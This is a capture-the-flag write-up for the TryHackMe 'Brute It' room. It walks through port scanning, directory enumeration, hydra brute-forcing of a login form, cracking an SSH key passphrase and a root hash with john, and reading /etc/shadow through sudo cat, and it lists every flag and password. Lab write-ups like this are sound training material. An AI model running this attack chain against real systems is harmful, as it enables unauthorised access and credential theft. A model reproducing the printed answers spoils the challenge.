
# Brute It - TryHackMe Writeup

This is a writeup for the "Brute It" challenge on TryHackMe, you can find it [here](https://tryhackme.com/room/bruteit)

---

## Steps

### 1. Initial Reconnaissance
- Scanned the target with `nmap`:
  ```bash
  nmap -A -sV -p- [VICTIM IP]
  ```
- Example:
  ```bash
  nmap -A -sV -p- 10.10.100.244
  ```
- Flags explained:
  - `-A`: Aggressive scan (OS detection, version detection, scripts, traceroute).
  - `-sV`: Detect service versions.
  - `-p-`: Scan all 65,535 ports.
- Results:
  ```
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux)
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  ```
- Open ports: `2`
- SSH version: `OpenSSH 7.6p1`
- Apache version: `2.4.29`
- Linux distribution: `Ubuntu` (guessed).

### 2. Web Enumeration
- Ran `gobuster` with extensions:
  ```bash
  gobuster dir -u http://[VICTIM IP] -w [WORDLIST PATH] -x .php,.txt
  ```
- Example:
  ```bash
  gobuster dir -u http://10.10.100.244 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt
  ```
- Flags explained:
  - `dir`: Directory enumeration mode.
  - `-u`: Target URL.
  - `-w`: Wordlist path.
  - `-x .php,.txt`: Check for `.php` and `.txt` files.
- Results:
  ```
  /admin         (Status: 301)
  ```
- Hidden directory: `/admin`
- Enumerated `/admin` further:
  ```bash
  gobuster dir -u http://[VICTIM IP]/admin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt
  ```
- Results:
  ```
  /index.php     (Status: 200)
  /panel         (Status: 301)
  ```

### 3. Brute-Force Admin Panel
- Inspected `http://[VICTIM IP]/admin/index.php` source code, found username `admin`.
- Attempted `hydra` :
  ```bash
  hydra -l admin -P [WORDLIST PATH] [VICTIM IP] http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:invalid"
  ```
- Example:
  ```bash
  hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.100.244 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:invalid"
  ```
- Flags explained:
  - `-l`: Single username (`admin`).
  - `-P`: Password wordlist.
  - `http-post-form`: Attack type.
  - `"/admin/index.php:user=^USER^&pass=^PASS^:invalid"`: Form URL, parameters, and failure string.
- Output:
  ```
  [80][http-post-form] host: 10.10.100.244   login: admin   password: xavier
  ```
- Credentials: `admin:xavier`
- Logged in at `http://[VICTIM IP]/admin/index.php`, found:
  - Web flag: `THM{brut3_f0rce_is_e4sy}`
  - RSA private key (saved as `key.pem` with 'nano').

### 4. Crack RSA Key
- Converted RSA key to hash:
  ```bash
  /opt/john/ssh2john.py key.pem > rsa_hash.txt
  ```
- Cracked it with `john`:
  ```bash
  john --wordlist=/usr/share/wordlists/rockyou.txt rsa_hash.txt
  ```
- Flags explained:
  - `--wordlist`: Password list.
- Output:
  ```
  rockinroll       (key.pem)
  ```
- Passphrase: `rockinroll`

### 5. Gain SSH Access
- Set key permissions:
  ```bash
  chmod 400 key.pem
  ```
- Attempted SSH without key (mistake):
  ```bash
  ssh john@[VICTIM IP]
  ```
- Failed with password prompts.
- Used the key:
  ```bash
  ssh -i key.pem john@[VICTIM IP]
  ```
- Example:
  ```bash
  ssh -i key.pem john@10.10.100.244
  ```
- Entered passphrase `rockinroll` logged in as `john`.

### 6. Find User Flag
- Checked home directory:
  ```bash
  pwd
  ls
  ```
- Output: `/home/john`, `user.txt`
- Read it:
  ```bash
  cat user.txt
  ```
- Content: `THM{a_password_is_not_a_barrier}`

### 7. Privilege Escalation
- Checked `sudo` privileges:
  ```bash
  sudo -l
  ```
- Output:
  ```
  User john may run the following commands on bruteit:
      (root) NOPASSWD: /bin/cat
  ```
- Used `/bin/cat` from [here](https://gtfobins.github.io/gtfobins/cat/):
  - Read `/etc/shadow`:
    ```bash
    LFILE=/etc/shadow
    sudo cat "$LFILE"
    ```
  - Extracted root hash:
    ```
    root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:...
    ```
- Saved and cracked it:
  ```bash
  echo 'root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:' > hash.txt
  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
  ```
- Output:
  ```
  football         (root)
  ```
- Root password: `football`
- Considered cracking John’s password but it took too long, so i skipped it.

### 8. Find Root Flag
- Guessed `root.txt` location with `sudo cat`:
  ```bash
  sudo cat /root/root.txt
  ```
- Content: `THM{pr1v1l3g3_3sc4l4t10n}`

---

## Answers to Challenge Questions
1. **How many ports are open?**: `2`
2. **SSH version**: `OpenSSH 7.6p1`
3. **Apache version**: `2.4.29`
4. **Linux distribution**: `Ubuntu`
5. **Hidden directory**: `/admin`
6. **Admin panel user:password**: `admin:xavier`
7. **John’s RSA key passphrase**: `rockinroll`
8. **user.txt**: `THM{a_password_is_not_a_barrier}`
9. **Web flag**: `THM{brut3_f0rce_is_e4sy}`
10. **Root password**: `football`
11. **root.txt**: `THM{pr1v1l3g3_3sc4l4t10n}`

---

## Tools Used
- `nmap`: Port and service scanning.
- `gobuster`: Directory enumeration.
- `hydra`: HTTP form brute-forcing.
- `ssh2john.py` & `john`: RSA key and hash cracking.
- `ssh`: Remote access.

---

## Lessons Learned
- Source code can leak usernames or hints.
- RSA keys need proper permissions (`chmod 400`).
- `sudo cat` with `NOPASSWD` can read sensitive files like `/etc/shadow`.

---
